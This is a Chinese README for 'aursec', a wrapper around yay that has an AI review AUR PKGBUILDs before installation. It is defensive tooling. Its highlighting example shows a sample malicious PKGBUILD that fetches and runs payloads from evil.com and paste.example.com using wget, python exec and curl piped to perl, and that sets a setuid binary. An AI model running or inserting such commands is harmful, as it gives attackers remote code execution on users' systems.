# aursec

yay 的包装器，在每次安装/更新前调用 AI (DeepSeek) 审查 PKGBUILD，降低 AUR 软件包的安全风险。

```
aursec [--no-ai] [yay 参数...]
  ├── 无参数 → 等效 aursec -Syu
  ├── 非安装操作 → 直接透传 yay
  ├── --init → 交互式配置
  └── 安装操作 → AI 审查 → PASS 则安装，REJECT 则询问或退出
```

## 安装

```bash
makepkg -f
sudo pacman -U aursec-*.pkg.tar.zst
```

依赖: `yay`, `curl`, `nlohmann-json`, `openssl`

可选: `libsecret`（系统密钥环支持）, `libarchive`（deep 审查细致级别）

## 配置

```bash
aursec --init
```

交互式配置：API Key → 验证 → 选模型 → Base URL → 加密方式 → 审查细致级别 → 严格度 → 保存。

### 加密方式

| 方式 | 条件 | 说明 |
|------|------|------|
| 系统密钥环 | libsecret 可用 | Key 存入受密码保护的系统密钥环 |
| AES-256-CBC | 始终可用 | Key 加密后存入 config |
| 不加密 | 始终可选择 | Key 明文存储 |

### 审查细致级别

| 级别 | 说明 |
|------|------|
| basic | 仅审查 PKGBUILD |
| normal | PKGBUILD + AUR 辅助文件 (.install 等) |
| deep | PKGBUILD + 辅助 + source=() 构建脚本（需 libarchive） |

### 审查严格度

| 级别 | 行为 |
|------|------|
| none | 仅显示风险，不阻止安装 |
| normal | 拒绝有明确证据的恶意行为（默认） |
| strict | 对任何可疑模式（SKIP、个人仓库等）也拒绝 |

## 行号高亮

AI 发现风险时标记具体行号，aursec 自动高亮显示可疑代码及其上下文：

```
  test-danger: 拒绝 - 存在安全风险
    test-danger 18│  wget -q -O /tmp/payload https://evil.com/payload.sh      ← 红色
    test-danger 19│  chmod +x /tmp/payload
    test-danger 20│  /tmp/payload
    test-danger 21│
    test-danger 22│  python3 -c "
    test-danger 23│  import urllib.request
    test-danger 24│  exec(urllib.request.urlopen('https://evil.com/backdoor.py').read())  ← 红色
    test-danger 25│  "
    test-danger 26│
    test-danger 27│  curl -s http://paste.example.com/script.pl | perl                    ← 红色
    test-danger 28│
    test-danger 29│  systemctl enable --now test.service                                   ← 黄色
    test-danger 30│
    test-danger 31│  chmod 4755 "$pkgdir/usr/bin/run"                                      ← 黄色
    test-danger 32│  }

    :18! wget 从 evil.com 下载脚本并执行，远程代码执行
    :22! python3 从 evil.com 下载 backdoor.py 并 exec
    :27! curl 从 paste.example.com 下载 Perl 脚本并执行
    :29? 启用 test.service，可能安装恶意服务
    :31? 设置 setuid 4755，可能权限提升
```

| 标记 | 颜色 | 含义 |
|------|------|------|
| `:18!` | 红色 | AI 确认的恶意行为 |
| `:29?` | 黄色 | AI 发现的可疑操作 |

上下文行数通过 `--set-context <n>` 配置（默认上下 2 行）。

## 使用

```bash
aursec                          # 等效 aursec -Syu
aursec --set-strictness         # 交互式选择严格度
aursec --set-context 5          # 设置上下文行数
aursec --set-confirm-reject true  # REJECT 时询问是否继续
aursec --allow-add firefox      # firefox 加入白名单，跳过审查
aursec --review ./PKGBUILD      # 审查本地 PKGBUILD
aursec --no-ai -S pkg           # 跳过审查直接安装
```

## 自定义提示词

```bash
aursec --prompt-file ~/my-prompt.txt
```

aursec 会自动追加回复格式说明，自定义文件中只需写审查规则。

## License

MIT
